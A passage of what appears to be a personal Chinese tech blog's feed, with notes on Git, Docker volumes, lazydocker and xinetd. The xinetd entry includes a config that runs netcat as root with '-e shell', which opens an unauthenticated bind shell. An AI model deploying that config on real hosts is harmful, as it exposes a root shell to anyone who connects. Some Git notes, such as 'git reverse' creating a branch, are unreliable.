    <link href="/2022/09/26/Git-push-%E6%97%B6-pre-recieve-hook-declined-%E9%97%AE%E9%A2%98/"/>
    <url>/2022/09/26/Git-push-%E6%97%B6-pre-recieve-hook-declined-%E9%97%AE%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<p>可能是 push 的文件过大.</p>]]></content>
    
    
    <categories>
      
      <category>Git</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>关于-Dockerfile-中的-VOLUME-指令</title>
    <link href="/2022/09/26/%E5%85%B3%E4%BA%8E-Dockerfile-%E4%B8%AD%E7%9A%84-VOLUME-%E6%8C%87%E4%BB%A4/"/>
    <url>/2022/09/26/%E5%85%B3%E4%BA%8E-Dockerfile-%E4%B8%AD%E7%9A%84-VOLUME-%E6%8C%87%E4%BB%A4/</url>
    
    <content type="html"><![CDATA[<p><a href="https://blog.csdn.net/qq32933432/article/details/12944205">参考</a></p><h1 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h1><p>在没有在 <code>docker run</code> 时使用 <code>-v</code> 选项时, 创建一个隐藏数据卷.</p><h2 id="什么是隐藏数据卷"><a href="#什么是隐藏数据卷" class="headerlink" title="什么是隐藏数据卷"></a>什么是隐藏数据卷</h2><p>也就是没有指定宿主机上面的某一个目录, 因此自动在 <code>/var/lib/docker/volumes</code> 目录下自动创建的一个卷.</p><h2 id="VOLUME-的作用"><a href="#VOLUME-的作用" class="headerlink" title="VOLUME 的作用"></a>VOLUME 的作用</h2><p>比如我们在 Dockerfile 中写 <code>VOLUME [ &quot;/Blog&quot; ]</code>, 并且在 run 的时候没有添加 <code>-v</code> 选项, 那么在容器创建后, 会生成 <code>/Blog</code> 这个目录, 以及在 <code>/var/lib/docker/volumes</code> 下生成一个卷, 这两个相互映射.</p>]]></content>
    
    
    <categories>
      
      <category>Docker</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Docker-volume-理解</title>
    <link href="/2022/09/26/Docker-volume-%E7%90%86%E8%A7%A3/"/>
    <url>/2022/09/26/Docker-volume-%E7%90%86%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<p><a href="https://b23.tv/6iw9KU1">参考</a></p><h1 id="理解"><a href="#理解" class="headerlink" title="理解"></a>理解</h1><h2 id="本地"><a href="#本地" class="headerlink" title="本地"></a>本地</h2><p>volume 感觉和挂载类似, 如果命令如下:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">docker run -it --name test -v ~<span class="hljs-regexp">/Blog:/</span>home<span class="hljs-regexp">/Blog ubuntu /</span>bin/bash<br></code></pre></td></tr></table></figure><p>前者 <code>~/Blog</code> 是你自己机子上的目录 (即宿主机上的目录), 后者 <code>/home/Blog</code> 是 docker 容器内的目录, 如果你进入容器, 然后修改了 <code>/home/Blog</code> 下的文件, 比如说添加了一个文件 <code>file.c</code> 那么宿主机上的 <code>~/Blog</code> 目录中也会相应被添加了一个 <code>file.c</code>, 两者共享了这个目录, 反之在宿主机上操作这个目录也是同理.</p><h2 id="自己创建"><a href="#自己创建" class="headerlink" title="自己创建"></a>自己创建</h2><p>若是用:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">docker run -it --name test -v <span class="hljs-regexp">/home/</span>Blog ubuntu <span class="hljs-regexp">/bin/</span>bash<br></code></pre></td></tr></table></figure><p>没有指定本地的目录, 那么 docker 会在 <code>/var/lib/docker/volumes/</code> 目录下创建一个 volume, 并生成一个 ID 作为名称.</p><p>可以用 <code>docker volume</code> 命令来管理卷.</p><p>上面让 docker 创建卷也可以指定名称:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">docker run -it --name test -v volumetest:<span class="hljs-regexp">/home/</span>Blog ubuntu <span class="hljs-regexp">/bin/</span>bash<br></code></pre></td></tr></table></figure><h2 id="指定权限"><a href="#指定权限" class="headerlink" title="指定权限"></a>指定权限</h2><p>有 <code>rw</code> (read and write) 和 <code>ro</code> (read only), 如:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">docker run -it --name test -v volumetest:<span class="hljs-regexp">/home/</span>Blog:ro ubuntu <span class="hljs-regexp">/bin/</span>bash<br></code></pre></td></tr></table></figure><h2 id="多个容器中共享"><a href="#多个容器中共享" class="headerlink" title="多个容器中共享"></a>多个容器中共享</h2><p>一个容器在 <code>run</code> 的时候, 用 <code>--volume-from</code> 这一个命令指定另一个容器, 就能获取另一个容器的全部 volume.</p><p>如:</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">docker <span class="hljs-built_in">run</span> -<span class="hljs-keyword">it</span> <span class="hljs-comment">--name test2 --volume-from test1 ubuntu:20.04 /bin/bash</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Docker</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>什么是-JekyII</title>
    <link href="/2022/09/25/%E4%BB%80%E4%B9%88%E6%98%AF-JekyII/"/>
    <url>/2022/09/25/%E4%BB%80%E4%B9%88%E6%98%AF-JekyII/</url>
    
    <content type="html"><![CDATA[<p><a href="https://jekyllrb.com/docs/">官网</a></p><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>JekyII 是一个静态网站生成器.</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>lazydocker-使用</title>
    <link href="/2022/09/25/lazydocker-%E4%BD%BF%E7%94%A8/"/>
    <url>/2022/09/25/lazydocker-%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<p><a href="https://github.com/jesseduffield/lazydocker">Github 相关页</a></p><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>Arch Linux 可以直接用 yay 下载:</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>yay -S lazydocker<br></code></pre></td></tr></table></figure><h1 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h1><p>配置文件在 ArchLinux 上位于 <code>~/.config/lazydocker/config.yml</code>.</p><p>在 <a href="https://godoc.org/github.com/jesseduffield/lazydocker/pkg/config">这个网站</a> 查看所有可以配置的参数.</p><p>可以通过 <code>lazydocker --config</code> 来查看默认配置.</p><p>在 lazydocker 里面就上面那一栏, 通过 <code>e</code> 可以直接编辑配置文件.</p><h2 id="自定义-commands"><a href="#自定义-commands" class="headerlink" title="自定义 commands"></a>自定义 commands</h2><p>如:</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">customCommands:</span><br>  <span class="hljs-attr">containers:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">bash</span><br>      <span class="hljs-attr">attach:</span> <span class="hljs-literal">true</span><br>      <span class="hljs-attr">command:</span> <span class="hljs-string">&#x27;docker exec -it <span class="hljs-template-variable">&#123;&#123; .Container.ID &#125;&#125;</span> bash&#x27;</span><br>      <span class="hljs-attr">serviceNames:</span> []<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Docker</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>xinetd-相关说明</title>
    <link href="/2022/09/25/xinetd-%E7%9B%B8%E5%85%B3%E8%AF%B4%E6%98%8E/"/>
    <url>/2022/09/25/xinetd-%E7%9B%B8%E5%85%B3%E8%AF%B4%E6%98%8E/</url>
    
    <content type="html"><![CDATA[<p><a href="https://cloud.tencent.com/developer/article/1804980">参考</a><br>在 Linux 中一些不长期使用的服务, 没有被作为单独的守护进程在开机时启用, Linux 把这些服务监听端口全部由一个独立的进程 xinetd 集中监听, 当收到相应的客户端请求之后, xinetd 进程就临时启动相应服务并把相应端口移交给相应服务, 客户端断开之后, 相应的服务进程结束, xinetd 继续监听.</p><p>也就是说用来管理一些服务, 将一个请求传给其他服务.</p><h2 id="守护进程分为两种处理模式"><a href="#守护进程分为两种处理模式" class="headerlink" title="守护进程分为两种处理模式"></a>守护进程分为两种处理模式</h2><ul><li>stand alone, 该程序始终监听, 一直处于运行状态</li><li>super daemon, 始终处于 sleep 状态, 知道有人唤醒.</li></ul><h2 id="什么是-xinetd"><a href="#什么是-xinetd" class="headerlink" title="什么是 xinetd"></a>什么是 xinetd</h2><p>全称为 extended interet daemon.</p><p>是网络守护进程服务程序, 常用来管理多种轻量级 Internet 服务.</p><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>原则上任何系统服务都可以使用 xinetd, 最适合的是 Internet 服务.j</p><p>具体服务可以使用 xinetd 服务在 <code>/etc/services</code> 文件中指出. 文件中记录的内容为:</p><ul><li>网络服务名</li><li>使用的端口号和协议</li></ul><h2 id="etc-xinetd-conf-和-etc-xinetd-d"><a href="#etc-xinetd-conf-和-etc-xinetd-d" class="headerlink" title="/etc/xinetd.conf 和 /etc/xinetd.d/*"></a><code>/etc/xinetd.conf</code> 和 <code>/etc/xinetd.d/*</code></h2><p>xinetd 的配置文件是 <code>/etc/xinetd.conf</code> , 但它只包括几个默认值及 <code>/etc/xinetd.d</code> 目录中的配置文件.</p><h2 id="配置-xinetd"><a href="#配置-xinetd" class="headerlink" title="配置 xinetd"></a>配置 xinetd</h2><h3 id="格式"><a href="#格式" class="headerlink" title="格式"></a>格式</h3><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">service <span class="hljs-tag">&lt;<span class="hljs-name">service-name</span>&gt;</span></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;</span><br><span class="hljs-template-variable">    ...</span><br><span class="hljs-template-variable">&#125;</span><br></code></pre></td></tr></table></figure><p><code>service</code> 是关键字.</p><p>操作符可以是 <code>=</code>, <code>+=</code>, <code>-=</code>.</p><h3 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h3><p>除了<code>/etc/xinetd.conf</code> 和 <code>/etc/xinetd.d/*</code> 外还有 <code>/etc/hosts.allow</code> 及 <code>/etc/hosts.deny</code></p><h3 id="禁用和启用"><a href="#禁用和启用" class="headerlink" title="禁用和启用"></a>禁用和启用</h3><p>disabled 列表和 enabled 列表.</p><h1 id="参考-B站"><a href="#参考-B站" class="headerlink" title="参考 B站"></a><a href="https://b23.tv/FuT3XPw">参考 B站</a></h1><p>在我的 <code>/etc/xinetd.conf</code> 文件里, 内容为:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs conf"># /etc/xinetd.conf<br>#<br><br>defaults<br>&#123;<br>        instances               = 60<br>        log_type                = SYSLOG authpriv<br>        log_on_success          = HOST PID<br>        log_on_failure          = HOST<br>        cps                     = 25 30<br>&#125;<br><br>includedir /etc/xinetd.d<br></code></pre></td></tr></table></figure><p>最后一行的这个 <code>includedir</code> 表示 xinetd 管理的, 服务的 xinetd 配置所在的目录.</p><p>查看这个目录:</p><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs dos">$ ls /etc/xinetd.d/<br>chargen<br>chargen-udp<br>daytime<br>daytime-udp<br>discard<br>discard-udp<br><span class="hljs-built_in">echo</span><br><span class="hljs-built_in">echo</span>-udp<br>servers<br>services<br><span class="hljs-built_in">time</span><br><span class="hljs-built_in">time</span>-udp<br></code></pre></td></tr></table></figure><p>比如, 如果要让 xinetd 管理 telnet 服务, 在 <code>/etc/xinetd.d/</code> 目录下添加一个文件, 叫 <code>telnet</code>, 然好添加内容 (这里 <code>#</code> 在实际中可能并不是注释符):</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs perl">service telnet<br>&#123;<br>    flags = REUSE                   <span class="hljs-comment"># 表示反对, 作用不知</span><br>    socket_type = stream            <span class="hljs-comment"># 使用的 TCP/IP socket 类型, 值可能为 stream(TCP), dgram(UDP), raw, seqpacket</span><br>    <span class="hljs-keyword">wait</span> = <span class="hljs-keyword">no</span>                       <span class="hljs-comment"># no 即并行连接, yes 为串行连接</span><br>    user = root                     <span class="hljs-comment"># 设置服务进程的 UID</span><br>    server =<span class="hljs-regexp">/usr/</span>bin/in.telnetd     <span class="hljs-comment"># 服务的命令所在位置</span><br>    log_on_failure += USERID        <span class="hljs-comment"># 指定失败时登记的信息</span><br>    disable = <span class="hljs-keyword">no</span>                    <span class="hljs-comment"># 表示服务是否开启 yes/no</span><br>&#125;<br></code></pre></td></tr></table></figure><p>所有信息可以在 <code>man xinetd.conf</code> 中查看.</p><p>还有几个比较常用:</p><ul><li><code>server_args</code>, 传给 <code>server</code> 的参数</li><li><code>port</code>, 如果 <code>/etc/services</code> 里面列出了服务的 port, 必须和其一样</li></ul><p>举 port 的例子, 如果 service 是这样写的:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs routeros">service netcat<br>&#123;<br>   <span class="hljs-built_in"> port </span>= 50000<br>    flags = REUSE                   <br>    socket_type = stream             <br>    wait = <span class="hljs-literal">no</span>                       <br>   <span class="hljs-built_in"> user </span>= root                     <br>   <span class="hljs-built_in"> server </span>=/usr/bin/netcat<br>    server_args = -lp 50001 -e shell<br>    log_on_failure += USERID        <br>    <span class="hljs-built_in">disable</span> = <span class="hljs-literal">no</span>                    <br>&#125;<br></code></pre></td></tr></table></figure><p>你在另一个终端向 50000 端口发起连接:</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$</span> nc localhost <span class="hljs-number">50000</span><br><span class="hljs-variable">$</span> <span class="hljs-built_in">ls</span><br></code></pre></td></tr></table></figure><p>你发现 <code>ls</code> 没有出现结果, 因为连接 50000 端口只是激活 <code>netcat</code> 这个服务, 然后再用:</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$</span> nc localhost <span class="hljs-number">50001</span> <br><span class="hljs-variable">$</span> <span class="hljs-built_in">ls</span><br></code></pre></td></tr></table></figure><p>发现成功连接到 shell.</p><p>可以设置, 允许谁访问, 谁不能访问, 最大连接数, 每个 IP 能有几个连接, 什么时间连接, 服务端口等.</p><h2 id="启动-xinetd-服务"><a href="#启动-xinetd-服务" class="headerlink" title="启动 xinetd 服务"></a>启动 xinetd 服务</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$</span> systemctl <span class="hljs-built_in">start</span> xinetd<br></code></pre></td></tr></table></figure><p>查看当前哪些端口是打开的:</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>netstat -ntpl<br></code></pre></td></tr></table></figure><p><code>-n</code> 是 <code>--numeric</code>, 显示数字地址而不是 symbolic.</p><p><code>-p</code> 是 <code>--program</code>, 显示 socket 所属的 PID.</p><p><code>-l</code> 是 <code>--listening</code>, 只显示监听 socket. 具体看 <code>man netstat</code>.</p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>watch-命令的部分使用</title>
    <link href="/2022/09/25/watch-%E5%91%BD%E4%BB%A4%E7%9A%84%E9%83%A8%E5%88%86%E4%BD%BF%E7%94%A8/"/>
    <url>/2022/09/25/watch-%E5%91%BD%E4%BB%A4%E7%9A%84%E9%83%A8%E5%88%86%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<p><code>-n</code> (interval) 参数, 指定时间, 如:</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">$ watch -n <span class="hljs-string">.5</span> tree <span class="hljs-string">.git</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Git-内部原理</title>
    <link href="/2022/09/25/Git-%E5%86%85%E9%83%A8%E5%8E%9F%E7%90%86/"/>
    <url>/2022/09/25/Git-%E5%86%85%E9%83%A8%E5%8E%9F%E7%90%86/</url>
    
    <content type="html"><![CDATA[<p><a href="https://b23.tv/3fH8R93">参考</a><br>用哈希算法, 利用文件内容 (和文件名无关) 生成哈希值, 保证每次提交的独立和完整.</p><p>每次提交都会生成当前所有文件的快照, 并保存快照的索引, 如果有些文件没有修改, git 就不会存储那个文件, 而只是保留一个链接, 指向之前存储的文件.</p><p>Git 是一个内容寻址文件系统, 其核心部分是键值对数据库.</p><p>在 object 这个目录下, 几个类型的对象, blob, tree, commit.</p><p>blob 对象记录文件内容, tree 对象记录 blob 的相关信息, commit 对象记录 tree 的相关信息.</p><p>即:</p><ul><li>Commit : 作者, 信息, 指针</li><li>Tree : 一个指向文件名, 内容和其他 tree 的指针</li><li>Blob : 数据</li></ul><p><code>git add</code> 命令的作用就是在代码仓库生成一个 blob 节点, 并修改 tree 的指针.</p><h2 id="分支"><a href="#分支" class="headerlink" title="分支"></a>分支</h2><p>master 指针所处的位置, <code>.git/refs/heads/master</code>:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cat</span> .git/refs/heads/master</span><br></code></pre></td></tr></table></figure><p>就能看到 master 所指的地方.</p><p>所以分支其实就是指向不同 commit 的指针.</p><h1 id="Pro-Git-最后一章"><a href="#Pro-Git-最后一章" class="headerlink" title="Pro Git 最后一章"></a>Pro Git 最后一章</h1>]]></content>
    
    
    <categories>
      
      <category>Git</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>学自-learngitbranching-这个网页</title>
    <link href="/2022/09/25/%E5%AD%A6%E8%87%AA-learngitbranching-%E8%BF%99%E4%B8%AA%E7%BD%91%E9%A1%B5/"/>
    <url>/2022/09/25/%E5%AD%A6%E8%87%AA-learngitbranching-%E8%BF%99%E4%B8%AA%E7%BD%91%E9%A1%B5/</url>
    
    <content type="html"><![CDATA[<p><a href="https://learngitbranching.js.org/">learngitbranching</a></p><h1 id="Rebase"><a href="#Rebase" class="headerlink" title="Rebase"></a>Rebase</h1><p>这里有一张图片:<br><img src="/../img/2022-09-25_07-59.png" alt="Rebase"></p><p>Rebase 其实理解起来就是, 将一个分支的所有工作, 以另一个分支为起点提交. <code>git rebase [一个分支名]</code>, 这里选取的分支就是作为新的起点.</p><h1 id="Detach-HEAD"><a href="#Detach-HEAD" class="headerlink" title="Detach HEAD"></a>Detach HEAD</h1><p>为什么叫 Detach 呢? 因为 HEAD 和分支分离了, 指向了一个 commit.</p><h1 id="Relative-refs"><a href="#Relative-refs" class="headerlink" title="Relative refs"></a>Relative refs</h1><p>通过提交的相对位置来移动 HEAD 指针, 而不是用 Hash 值.</p><ul><li>向上一次用 <code>^</code></li><li>向上多次用 <code>~&lt;num&gt;</code></li></ul><p>如:</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>git checkout main^<br></code></pre></td></tr></table></figure><p>用 HEAD 指针退回:</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>git checkout C3<br><span class="hljs-variable">$ </span>git checkout HEAD^<br></code></pre></td></tr></table></figure><p>强制一个 branch 移动:</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$</span> git branch <span class="hljs-operator">-f</span> main HEAD~<span class="hljs-number">3</span><br></code></pre></td></tr></table></figure><p>main 会回退到 HEAD 指针的 3 次提交前.</p><h1 id="Reverse-Changes-in-Git"><a href="#Reverse-Changes-in-Git" class="headerlink" title="Reverse Changes in Git"></a>Reverse Changes in Git</h1><p>两个方法:</p><ul><li>reset</li><li>revert</li></ul><p><code>git reset</code>, 用于 local, 其实就是回退, 如 <code>git reset HEAD~3</code>.</p><p><code>git reverse</code> 用于 remote, 这个命令会生成一个新的 branch 来介绍改变的内容.</p><h1 id="Git-Cherry-pick"><a href="#Git-Cherry-pick" class="headerlink" title="Git Cherry-pick"></a>Git Cherry-pick</h1><p>看命令的名字就知道, 我们当前 HEAD 所在分支想要获取其他 commit 的内容, 比如 c2, c4, 那么:</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm">$ git cherry-pick <span class="hljs-built_in">c2</span> <span class="hljs-built_in">c4</span><br></code></pre></td></tr></table></figure><p>就会让 HEAD 所在分支前进两步, 获取 c2 和 c4 两次 commit 的内容.</p><h1 id="Git-Interactive-Rebase"><a href="#Git-Interactive-Rebase" class="headerlink" title="Git Interactive Rebase"></a>Git Interactive Rebase</h1><p>也就是使用 <code>git rebase</code> 的 <code>-i</code> 选项.</p><p>如:</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>git rebase -i HEAD~<span class="hljs-number">4</span><br></code></pre></td></tr></table></figure><p>HEAD 指针就会以前第 4 次提交为 base, 然会会用 vim (或者其他) 打开一个界面, 选择刚才越过的四个里面哪些 commit 是需要的. 在你把某些 commit 选择为需要后则会在这个 base 上合并前进.</p><p>还可以调整 commit 的顺序等.</p><p><code>git commit --amend</code> 可以追加提交.</p><h1 id="Git-Tags"><a href="#Git-Tags" class="headerlink" title="Git Tags"></a>Git Tags</h1><p>不能 checkout 一个 tag 然后在上面工作 (意思是 branch 的名字不是叫 tag). 若要给 c1 添加一个 v1 的 tag:</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">$ git <span class="hljs-keyword">tag</span> <span class="hljs-title">v1</span> c1<br></code></pre></td></tr></table></figure><p>可以利用 tag 跳转.</p><h1 id="Git-Describe"><a href="#Git-Describe" class="headerlink" title="Git Describe"></a>Git Describe</h1><p><code>git describe</code> 这个命令可以描述, 某一个 commit 距离其最近的 tag 的一些相关信息, 如相隔多少个 commit, 以及这一个 commit 的 hash 值.</p><h1 id="Specifying-Parents"><a href="#Specifying-Parents" class="headerlink" title="Specifying Parents"></a>Specifying Parents</h1><h1 id="Git-Remote-Branches"><a href="#Git-Remote-Branches" class="headerlink" title="Git Remote Branches"></a>Git Remote Branches</h1><p>拉去下来的分支称为远程分支. 名称格式为 <code>&lt;remote name&gt;/&lt;branch name&gt;</code>, 远程分支只有远程仓库更新了才会更新, 不然不会移动, 移动的只是 HEAD.</p><h1 id="Git-Fetch"><a href="#Git-Fetch" class="headerlink" title="Git Fetch"></a>Git Fetch</h1><p><code>git fetch</code> 这个命令可以更新远程分支. 但不会更改 local 的状态.</p><h1 id="Git-Pull"><a href="#Git-Pull" class="headerlink" title="Git Pull"></a>Git Pull</h1><p><code>git pull</code> 命令不仅跟新远程分支, 还会将其和 local 的分支 merge.</p><h1 id="Simulating-colaboration"><a href="#Simulating-colaboration" class="headerlink" title="Simulating colaboration"></a>Simulating colaboration</h1><p><code>git fakeTeamwork</code> 假设远端跟新, 可以指定 branch name 和 commit 个数:</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>git fakeTeamwork foo <span class="hljs-number">3</span><br></code></pre></td></tr></table></figure><h1 id="Git-Push"><a href="#Git-Push" class="headerlink" title="Git Push"></a>Git Push</h1><p><code>git push</code> 不加参数, 所依据的是 <code>push.default</code> 的内容. 且本地的远程分支也会更新.</p><h1 id="Diverged-Work"><a href="#Diverged-Work" class="headerlink" title="Diverged Work"></a>Diverged Work</h1><p><code>git pull --rebase</code> 相当于先 <code>fetch</code> 然后再 <code>rebase</code>. 其以远程分支的节点为 base.</p><h1 id="Remote-Rejected"><a href="#Remote-Rejected" class="headerlink" title="Remote Rejected"></a>Remote Rejected</h1><p>local 更改的起点和 remote 不同.</p><p>即遇到 <code>! [remote rejected] main -&gt; main (TF402455: Pushes to this branch are not permitted; you must use a pull request to update this branch.)</code> 这种报错.</p><h1 id="Mergin-feature-branches"><a href="#Mergin-feature-branches" class="headerlink" title="Mergin feature branches"></a>Mergin feature branches</h1><p>将 feature 分支内容 merge 到 main 分支中.</p><h1 id="Remote-Tracking-branches"><a href="#Remote-Tracking-branches" class="headerlink" title="Remote-Tracking branches"></a>Remote-Tracking branches</h1><p>默认情况下, <code>git pull</code> 之后 main 分支会移动.</p><h1 id="Push-Arguments"><a href="#Push-Arguments" class="headerlink" title="Push Arguments"></a>Push Arguments</h1><p>格式为 <code>git push &lt;remote&gt; &lt;place&gt;</code></p><h1 id="lt-place-gt-Argument-Details"><a href="#lt-place-gt-Argument-Details" class="headerlink" title="&lt;place&gt; Argument Details"></a><code>&lt;place&gt; Argument Details</code></h1><p>将 local 上的一个 branch 提交到 remote 上的不同 branch.</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-variable">$ </span>git push origin &lt;source&gt;<span class="hljs-symbol">:&lt;destination&gt;</span><br></code></pre></td></tr></table></figure><h1 id="Git-fetch-arguments"><a href="#Git-fetch-arguments" class="headerlink" title="Git fetch arguments"></a>Git fetch arguments</h1><p>如:</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>git fetch origin foo<br></code></pre></td></tr></table></figure><p>设置和更改 remote tracking, 使用 <code>git branch -u o/main foo</code> 就设置 foo 来 track o&#x2F;main</p>]]></content>
    
    
    <categories>
      
      <category>Git</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>关于-Github-默认分支</title>
    <link href="/2022/09/25/%E5%85%B3%E4%BA%8E-Github-%E9%BB%98%E8%AE%A4%E5%88%86%E6%94%AF/"/>
    <url>/2022/09/25/%E5%85%B3%E4%BA%8E-Github-%E9%BB%98%E8%AE%A4%E5%88%86%E6%94%AF/</url>
    
    <content type="html"><![CDATA[<p>从以前的 master 分支变成了 main 分支.</p>]]></content>
    
    
    <categories>
      
      <category>Git</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>解决-coc-clangd-was-not-found-on-your-PATH-问题</title>
    <link href="/2022/09/23/%E8%A7%A3%E5%86%B3-coc-clangd-was-not-found-on-your-PATH-%E9%97%AE%E9%A2%98/"/>
    <url>/2022/09/23/%E8%A7%A3%E5%86%B3-coc-clangd-was-not-found-on-your-PATH-%E9%97%AE%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<p>可能还是网络的问题, 查看了 <code>~/.config/coc/extensions/coc-clangd-data/install</code> 目录, 结果为空, 因此直接从 <a href="https://clangd.llvm.org/">官网</a> 下载.</p><p>之后将解压后目录下的 bin 目录的路径添加到 PATH 中.</p>]]></content>
    
    
    <categories>
      
      <category>VIm</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>远程桌面控制软件-parsec</title>
    <link href="/2022/09/22/%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E6%8E%A7%E5%88%B6%E8%BD%AF%E4%BB%B6-parsec/"/>
    <url>/2022/09/22/%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E6%8E%A7%E5%88%B6%E8%BD%AF%E4%BB%B6-parsec/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>几个好用的命令行软件</title>
